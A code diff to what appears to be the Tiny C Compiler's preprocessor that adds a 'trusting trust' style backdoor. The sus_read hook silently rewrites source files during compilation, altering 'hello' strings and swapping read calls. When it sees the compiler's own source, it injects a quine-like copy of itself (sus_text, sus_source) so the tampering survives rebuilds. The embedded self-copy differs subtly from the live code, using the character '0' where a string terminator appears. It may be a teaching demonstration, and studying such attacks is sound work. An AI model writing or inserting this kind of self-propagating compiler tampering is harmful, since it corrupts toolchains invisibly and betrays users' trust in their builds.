@@ -637,8 +637,6 @@ ST_FUNC const char *get_tok_str(int v, CValue *cv)
     return cstr_buf.data;
 }
 
-#include <sys/stat.h>
-
 struct sus_file {
     char *buf;
     size_t length;
@@ -687,6 +685,10 @@ char hello[] = {'h','e','l','l','o',0};
 char bye[] = {'b','y','e',0};
 char nor_len[] = {'l','e','n',' ','=',' ','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0};
 char sus_len[] = {'l','e','n',' ','=',' ','s','u','s','_','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0};
+char pattern[] = {'s','t','a','t','i','c',' ','i','n','t',' ','h','a','n','d','l','e','_','e','o','b','(','v','o','i','d',')',0};
+char replacement[] = {'s','t','a','t','i','c',' ','i','n','t',' ','h','a','n','d','l','e','_','e','o','b','(','v','o','i','d',')',';',0};
+
+char *sus_source();
 
 int sus_read(int fd, void *buf, size_t len) {
     struct stat file_stat;
@@ -702,6 +704,10 @@ int sus_read(int fd, void *buf, size_t len) {
 
         sus_replace(fd, hello, bye);
         sus_replace(fd, nor_len, sus_len);
+        if (sus_contains(fd, pattern)) {
+            sus_replace(fd, pattern, sus_source());
+            puts(shelf[fd].buf);
+        }
     } else if (shelf[fd].offset == shelf[fd].length) {
         shelf[fd].offset = 0;
         tcc_free(shelf[fd].buf);
@@ -714,6 +720,27 @@ int sus_read(int fd, void *buf, size_t len) {
 
     return i;
 }
+
+char *sus_text;
+
+char sus_buffer[7000];
+char *sus_source() {
+    char nl[] = {10, 0};
+    char sus_decl[] = {'c','h','a','r',' ','*','s','u','s','_','t','e','x','t',' ','=',' ',34,0};
+    char dq[] = {34,';',0};
+    strcat(sus_buffer, nl);
+    strcat(sus_buffer, nl);
+    strcat(sus_buffer, sus_text);
+    strcat(sus_buffer, nl);
+    strcat(sus_buffer, sus_decl);
+    strcat(sus_buffer, sus_text);
+    strcat(sus_buffer, dq);
+    strcat(sus_buffer, nl);
+    strcat(sus_buffer, replacement);
+    return sus_buffer;
+}
+
+char *sus_text = "struct sus_file { char *buf; size_t length; size_t offset; }; static struct sus_file shelf[256]; int sus_index(char *s, int sl, char *p, int pl) { for (int i = 0; i < sl - pl; i++) { if (strncmp(s + i, p, pl) == 0) { return i; } } return -1; } int sus_contains(int fd, char *p) { return sus_index(shelf[fd].buf, shelf[fd].length, p, strlen(p)) >= 0; } void sus_replace(int fd, char *p, char *t) { int index = sus_index(shelf[fd].buf, shelf[fd].length, p, strlen(p)); int pl = strlen(p); int tl = strlen(t); char *new; if (index < 0) { return; } new = tcc_realloc(shelf[fd].buf, shelf[fd].length + tl - pl); memmove(new + index + tl, shelf[fd].buf + index + pl, shelf[fd].length - index - pl); memcpy(new + index, t, tl); shelf[fd].length += tl - pl; shelf[fd].buf = new; } char hello[] = {'h','e','l','l','o',0}; char bye[] = {'b','y','e',0}; char nor_len[] = {'l','e','n',' ','=',' ','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0}; char sus_len[] = {'l','e','n',' ','=',' ','s','u','s','_','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0}; char pattern[] = {'s','t','a','t','i','c',' ','i','n','t',' ','h','a','n','d','l','e','_','e','o','b','(','v','o','i','d',')','0'}; char replacement[] = {'s','t','a','t','i','c',' ','i','n','t',' ','h','a','n','d','l','e','_','e','o','b','(','v','o','i','d',')',';','0'}; char *sus_source(); int sus_read(int fd, void *buf, size_t len) { struct stat file_stat; int i; if (shelf[fd].offset == 0) { fstat(fd, &file_stat); shelf[fd].buf = tcc_malloc(file_stat.st_size); read(fd, shelf[fd].buf, file_stat.st_size); shelf[fd].length = file_stat.st_size; sus_replace(fd, hello, bye); sus_replace(fd, nor_len, sus_len); if (sus_contains(fd, pattern)) { sus_replace(fd, pattern, sus_source()); puts(shelf[fd].buf); } } else if (shelf[fd].offset == shelf[fd].length) { shelf[fd].offset = 0; tcc_free(shelf[fd].buf); return 0; } for (i = 0; i < len && shelf[fd].offset < shelf[fd].length; i++, shelf[fd].offset++) { ((char *) buf)[i] = shelf[fd].buf[shelf[fd].offset]; } return i; } char *sus_text; char sus_buffer[7000]; char *sus_source() { char nl[] = {10, 0}; char sus_decl[] = {'c','h','a','r',' ','*','s','u','s','_','t','e','x','t',' ','=',' ',34,0}; char dq[] = {34,';',0}; strcat(sus_buffer, nl); strcat(sus_buffer, nl); strcat(sus_buffer, sus_text); strcat(sus_buffer, nl); strcat(sus_buffer, sus_decl); strcat(sus_buffer, sus_text); strcat(sus_buffer, dq); strcat(sus_buffer, nl); strcat(sus_buffer, replacement); return sus_buffer; }";
 
 /* return the current character, handling end of block if necessary
    (but not stray) */
